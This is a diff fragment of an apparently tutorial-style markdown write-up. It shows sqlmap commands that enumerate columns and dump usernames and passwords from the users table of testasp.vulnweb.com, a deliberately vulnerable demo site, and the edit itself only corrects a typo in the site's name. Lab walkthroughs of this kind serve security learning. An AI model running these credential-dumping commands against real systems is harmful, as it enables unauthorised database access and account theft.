@@ -11,7 +11,7 @@
 - To find columns `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1-D acuforum -T users --columns`
 - Dump username and password column with data in a file `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1 -D acuforum -T users -C uname --dump` & `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1 -D acuforum -T users -C upass --dump`
 
-This is how the usernames and passwords of [Acuform](http://testasp.vulnweb.com/) were obtained including the admin credentials.
+This is how the usernames and passwords of [Acuforum](http://testasp.vulnweb.com/) were obtained including the admin credentials.
 
 # Dump / Screenshots
 ## Command 1
